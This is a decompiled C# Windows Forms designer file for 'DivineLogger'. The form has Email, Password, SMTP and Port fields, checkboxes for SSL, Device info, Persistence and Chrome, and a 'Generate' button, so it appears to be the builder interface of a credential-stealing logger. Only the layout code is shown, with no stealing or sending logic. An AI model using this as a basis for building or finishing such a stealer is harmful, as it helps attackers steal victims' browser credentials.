namespace DivineLogger
{
	// Token: 0x02000002 RID: 2
	public partial class DLogger : global::System.Windows.Forms.Form
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002366 File Offset: 0x00000566
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002388 File Offset: 0x00000588
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager resources = new global::System.ComponentModel.ComponentResourceManager(typeof(global::DivineLogger.DLogger));
			this.button1 = new global::System.Windows.Forms.Button();
			this.textBox1 = new global::System.Windows.Forms.TextBox();
			this.label1 = new global::System.Windows.Forms.Label();
			this.label2 = new global::System.Windows.Forms.Label();
			this.label3 = new global::System.Windows.Forms.Label();
			this.label4 = new global::System.Windows.Forms.Label();
			this.checkBox1 = new global::System.Windows.Forms.CheckBox();
			this.checkBox2 = new global::System.Windows.Forms.CheckBox();
			this.checkBox3 = new global::System.Windows.Forms.CheckBox();
			this.checkBox5 = new global::System.Windows.Forms.CheckBox();
			this.textBox2 = new global::System.Windows.Forms.TextBox();
			this.textBox3 = new global::System.Windows.Forms.TextBox();
			this.textBox4 = new global::System.Windows.Forms.TextBox();
			base.SuspendLayout();
			this.button1.BackColor = global::System.Drawing.Color.MediumSeaGreen;
			this.button1.Location = new global::System.Drawing.Point(12, 220);
			this.button1.Name = "button1";
			this.button1.Size = new global::System.Drawing.Size(232, 38);
			this.button1.TabIndex = 0;
			this.button1.Text = "Generate";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += new global::System.EventHandler(this.button1_Click);
			this.textBox1.Location = new global::System.Drawing.Point(142, 10);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new global::System.Drawing.Size(102, 22);
			this.textBox1.TabIndex = 1;
			this.label1.AutoSize = true;
			this.label1.BackColor = global::System.Drawing.Color.LimeGreen;
			this.label1.Location = new global::System.Drawing.Point(9, 13);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(110, 17);
			this.label1.TabIndex = 2;
			this.label1.Text = "Email                 ";
			this.label1.Click += new global::System.EventHandler(this.label1_Click);
			this.label2.AutoSize = true;
			this.label2.BackColor = global::System.Drawing.Color.LimeGreen;
			this.label2.Location = new global::System.Drawing.Point(9, 47);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(109, 17);
			this.label2.TabIndex = 3;
			this.label2.Text = "Password          ";
			this.label3.AutoSize = true;
			this.label3.BackColor = global::System.Drawing.Color.LimeGreen;
			this.label3.Location = new global::System.Drawing.Point(9, 80);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(110, 17);
			this.label3.TabIndex = 4;
			this.label3.Text = "SMTP                ";
			this.label4.AutoSize = true;
			this.label4.BackColor = global::System.Drawing.Color.LimeGreen;
			this.label4.Location = new global::System.Drawing.Point(9, 115);
			this.label4.Name = "label4";
			this.label4.Size = new global::System.Drawing.Size(110, 17);
			this.label4.TabIndex = 5;
			this.label4.Text = " Port                  ";
			this.checkBox1.AutoSize = true;
			this.checkBox1.BackColor = global::System.Drawing.Color.LimeGreen;
			this.checkBox1.Location = new global::System.Drawing.Point(12, 148);
			this.checkBox1.Name = "checkBox1";
			this.checkBox1.Size = new global::System.Drawing.Size(108, 21);
			this.checkBox1.TabIndex = 6;
			this.checkBox1.Text = " SSL            ";
			this.checkBox1.UseVisualStyleBackColor = false;
			this.checkBox1.CheckedChanged += new global::System.EventHandler(this.checkBox1_CheckedChanged);
			this.checkBox2.AutoSize = true;
			this.checkBox2.BackColor = global::System.Drawing.Color.LimeGreen;
			this.checkBox2.Location = new global::System.Drawing.Point(142, 148);
			this.checkBox2.Name = "checkBox2";
			this.checkBox2.Size = new global::System.Drawing.Size(100, 21);
			this.checkBox2.TabIndex = 7;
			this.checkBox2.Text = "Device info";
			this.checkBox2.UseVisualStyleBackColor = false;
			this.checkBox2.CheckedChanged += new global::System.EventHandler(this.checkBox2_CheckedChanged);
			this.checkBox3.AutoSize = true;
			this.checkBox3.BackColor = global::System.Drawing.Color.LimeGreen;
			this.checkBox3.Location = new global::System.Drawing.Point(12, 193);
			this.checkBox3.Name = "checkBox3";
			this.checkBox3.Size = new global::System.Drawing.Size(108, 21);
			this.checkBox3.TabIndex = 8;
			this.checkBox3.Text = "Persistence ";
			this.checkBox3.UseVisualStyleBackColor = false;
			this.checkBox3.CheckedChanged += new global::System.EventHandler(this.checkBox3_CheckedChanged);
			this.checkBox5.AutoSize = true;
			this.checkBox5.BackColor = global::System.Drawing.Color.LimeGreen;
			this.checkBox5.Location = new global::System.Drawing.Point(142, 193);
			this.checkBox5.Name = "checkBox5";
			this.checkBox5.Size = new global::System.Drawing.Size(99, 21);
			this.checkBox5.TabIndex = 10;
			this.checkBox5.Text = "Chrome     ";
			this.checkBox5.UseVisualStyleBackColor = false;
			this.checkBox5.CheckedChanged += new global::System.EventHandler(this.checkBox5_CheckedChanged);
			this.textBox2.Location = new global::System.Drawing.Point(142, 44);
			this.textBox2.Name = "textBox2";
			this.textBox2.Size = new global::System.Drawing.Size(102, 22);
			this.textBox2.TabIndex = 12;
			this.textBox3.Location = new global::System.Drawing.Point(142, 77);
			this.textBox3.Name = "textBox3";
			this.textBox3.Size = new global::System.Drawing.Size(102, 22);
			this.textBox3.TabIndex = 13;
			this.textBox4.Location = new global::System.Drawing.Point(142, 112);
			this.textBox4.Name = "textBox4";
			this.textBox4.Size = new global::System.Drawing.Size(102, 22);
			this.textBox4.TabIndex = 14;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(8f, 16f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			base.ClientSize = new global::System.Drawing.Size(256, 269);
			base.Controls.Add(this.textBox4);
			base.Controls.Add(this.textBox3);
			base.Controls.Add(this.textBox2);
			base.Controls.Add(this.checkBox5);
			base.Controls.Add(this.checkBox3);
			base.Controls.Add(this.checkBox2);
			base.Controls.Add(this.checkBox1);
			base.Controls.Add(this.label4);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.label2);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.textBox1);
			base.Controls.Add(this.button1);
			base.Icon = (global::System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "DLogger";
			this.Text = "DLogger";
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000001 RID: 1
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000002 RID: 2
		private global::System.Windows.Forms.Button button1;

		// Token: 0x04000003 RID: 3
		private global::System.Windows.Forms.TextBox textBox1;

		// Token: 0x04000004 RID: 4
		private global::System.Windows.Forms.Label label1;

		// Token: 0x04000005 RID: 5
		private global::System.Windows.Forms.Label label2;

		// Token: 0x04000006 RID: 6
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000007 RID: 7
		private global::System.Windows.Forms.Label label4;

		// Token: 0x04000008 RID: 8
		private global::System.Windows.Forms.CheckBox checkBox1;

		// Token: 0x04000009 RID: 9
		private global::System.Windows.Forms.CheckBox checkBox2;

		// Token: 0x0400000A RID: 10
		private global::System.Windows.Forms.CheckBox checkBox3;

		// Token: 0x0400000B RID: 11
		private global::System.Windows.Forms.CheckBox checkBox5;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.TextBox textBox2;

		// Token: 0x0400000D RID: 13
		private global::System.Windows.Forms.TextBox textBox3;

		// Token: 0x0400000E RID: 14
		private global::System.Windows.Forms.TextBox textBox4;
	}
}
